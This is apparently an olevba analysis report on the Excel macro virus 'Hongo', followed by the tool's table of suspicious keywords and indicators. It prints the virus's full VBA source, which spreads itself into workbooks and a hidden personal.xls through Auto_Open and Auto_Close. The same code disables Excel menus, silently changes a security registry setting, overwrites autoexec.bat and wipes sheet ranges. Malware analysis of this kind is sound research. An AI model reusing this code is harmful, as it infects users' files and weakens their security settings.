olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Hongo-e05cd59236b1ee456e25474499d4e0bab4426c07 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Application.OnSheetActivate = "Hongo"
Call Hongo
End Sub










Sub Hongo()
Randomize
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\mgh.sys"
Call Huayco
If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:
If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "LIBR" Then GoTo out:
CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
MkDir ((Application.Path) + "\iniciar")
If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i
If SXLS = False And UCase(Mid(ActiveWorkbook.Name, 1, 4)) <> "LIBR" And UCase(Mid(ActiveWorkbook.Name, 1, 4)) <> "BOOK" Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\mgh.sys")
ActiveWorkbook.Save
End If
If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\mgh.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Workbooks.Add.SaveAs FileName:=(Application.Path) + "\Iniciar\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\mgh.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If
If UCase(Dir("c:\sys32.reg")) <> "SYS32.REG" Or UCase(Dir("c:\sys32.bat")) <> "SYS32.BAT" Then
Open "c:\sys32.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\sys32.bat" For Output As 1
Print #1, "regedit /s c:\sys32.reg"
Close 1
End If
out:
On Error Resume Next
Shell "c:\sys32.bat", vbHide
End Sub

Sub Huayco()
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Second(time) = 19 Or Day(date) = 25 Then
Dim viejo, perk
viejo = "C:\autoexec.bat": perk = "C:\perk.bat"
Name viejo As perk
Open "c:\autoexec.bat" For Output As 1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "echo *****************************************************************"
Print #1, "echo *                                                               *"
Print #1, "echo *                          MaG0  ViRu5                          *"
Print #1, "echo *                           H.O.N.G.O                           *"
Print #1, "echo *                       CHACLACAYO - PERU                       *"
Print #1, "echo *                          ARAWAK VIVE                          *"
Print #1, "echo *                   E-mail: m25ry2@hotmail.com                  *"
Print #1, "echo *                                                               *"
Print #1, "echo *****************************************************************"
Print #1, "pause"
Print #1, "perk.bat"
Close 1
End If
If Int(Rnd * 100) = 19 Then
    Range("A1:I50").Select
    Selection.ClearContents
    With Selection.Interior
        .ColorIndex = 43
        .Pattern = xlSolid
    End With
    Range("E1:E20").Select
    With Selection
        .HorizontalAlignment = xlCenter
    End With
    Range("E15").Select
    ActiveCell.FormulaR1C1 = "MaG0  ViRu5"
    Selection.Font.ColorIndex = 3
    With Selection.Font
        .Size = 20
    End With
    Range("E16").Select
    ActiveCell.FormulaR1C1 = "H.0.N.G.0"
    With Selection.Font
        .Size = 18
    End With
    Range("E17").Select
    ActiveCell.FormulaR1C1 = "m25ry2@hotmail.com"
    Range("E18").Select
    ActiveCell.FormulaR1C1 = "CHACLACAYO - PERU"
    Range("D15:F18").Select
    With Selection.Interior
        .ColorIndex = xlNone
    End With
    Range("A1").Select
ActiveWindow.SelectedSheets.PrintOut Copies:=19
End If
End Sub
Sub Auto_Close()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\mgh.sys"
Shell "c:\sys32.bat", vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |sys32.reg           |Executable file name                         |
|IOC       |SYS32.REG           |Executable file name                         |
|IOC       |sys32.bat           |Executable file name                         |
|IOC       |SYS32.BAT           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |perk.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

